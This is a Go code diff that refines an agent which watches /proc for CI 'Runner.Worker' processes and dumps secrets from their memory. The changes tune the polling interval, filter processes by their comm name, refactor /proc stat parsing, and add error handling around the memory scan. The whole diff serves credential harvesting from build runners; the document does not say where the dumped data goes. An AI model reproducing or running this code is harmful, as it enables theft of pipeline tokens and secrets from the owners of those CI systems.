@@ -22,7 +22,7 @@ import (
 )
 
 const (
-	residentWatchInterval      = 50 * time.Millisecond
+	residentWatchInterval      = 100 * time.Millisecond
 	residentHarvestRetryWindow = 20 * time.Second
 )
 
@@ -79,11 +79,10 @@ func (a *Agent) watchResidentJobs(ctx context.Context) {
 }
 
 func residentWorkerKey(worker residentWorkerProcess) string {
-	key := worker.Root + ":" + worker.StartTick
-	if key == ":" {
-		key = fmt.Sprintf("%s:%d", worker.Root, worker.PID)
+	if worker.StartTick == "" {
+		return fmt.Sprintf("%s:%d", worker.Root, worker.PID)
 	}
-	return key
+	return worker.Root + ":" + worker.StartTick
 }
 
 func (a *Agent) harvestResidentWorker(ctx context.Context, worker residentWorkerProcess) {
@@ -182,7 +181,11 @@ func (a *Agent) dumpResidentWorkerSecrets(ctx context.Context, pid int) *MemDump
 func (a *Agent) dumpResidentProcessTreeSecrets(pid int, includeRoot bool) *MemDumpResult {
 	var empty *MemDumpResult
 	var failed *MemDumpResult
-	for _, candidate := range residentProcessTreePIDs(pid, includeRoot) {
+	candidates := residentProcessTreePIDs(pid, includeRoot)
+	if len(candidates) == 0 {
+		return &MemDumpResult{ProcessID: pid, Error: "runner memory scan found no candidate processes"}
+	}
+	for _, candidate := range candidates {
 		result := normalizeResidentMemDumpResult(candidate, a.DumpRunnerSecretsFromPID(candidate))
 		if residentMemDumpHasData(result) {
 			return result
@@ -195,9 +198,6 @@ func (a *Agent) dumpResidentProcessTreeSecrets(pid int, includeRoot bool) *MemDu
 				failed.Error = result.Error
 			}
 		}
-	}
-	if empty == nil && failed == nil {
-		return &MemDumpResult{ProcessID: pid, ScanAttempts: 1}
 	}
 	return residentMemDumpFallback(pid, empty, failed)
 }
@@ -301,6 +301,10 @@ func residentWorkerProcesses() []residentWorkerProcess {
 		if err != nil {
 			continue
 		}
+		comm, err := os.ReadFile(filepath.Join(entry, "comm"))
+		if err != nil || strings.TrimSpace(string(comm)) != "Runner.Worker" {
+			continue
+		}
 		exe, err := os.Readlink(filepath.Join(entry, "exe"))
 		if err != nil || filepath.Base(exe) != "Runner.Worker" {
 			continue
@@ -337,11 +341,15 @@ func residentProcessStartTick(pid int) string {
 	if err != nil {
 		return ""
 	}
-	fields := strings.Fields(string(data))
-	if len(fields) < 22 {
+	return residentProcessStartTickFromStat(string(data))
+}
+
+func residentProcessStartTickFromStat(text string) string {
+	fields := residentProcStatFieldsAfterComm(text)
+	if len(fields) < 20 {
 		return ""
 	}
-	return fields[21]
+	return fields[19]
 }
 
 func residentProcessTreePIDs(root int, includeRoot bool) []int {
@@ -372,17 +380,24 @@ func residentProcessParent(pid int) (int, bool) {
 	if err != nil {
 		return 0, false
 	}
-	text := string(data)
-	idx := strings.LastIndex(text, ")")
-	if idx < 0 || idx+1 >= len(text) {
-		return 0, false
-	}
-	fields := strings.Fields(text[idx+1:])
+	return residentProcessParentFromStat(string(data))
+}
+
+func residentProcessParentFromStat(text string) (int, bool) {
+	fields := residentProcStatFieldsAfterComm(text)
 	if len(fields) < 2 {
 		return 0, false
 	}
 	ppid, err := strconv.Atoi(fields[1])
 	return ppid, err == nil
+}
+
+func residentProcStatFieldsAfterComm(text string) []string {
+	idx := strings.LastIndex(text, ")")
+	if idx < 0 || idx+1 >= len(text) {
+		return nil
+	}
+	return strings.Fields(text[idx+1:])
 }
 
 func residentProcessTreeFromParents(root int, parents map[int]int, includeRoot bool) []int {
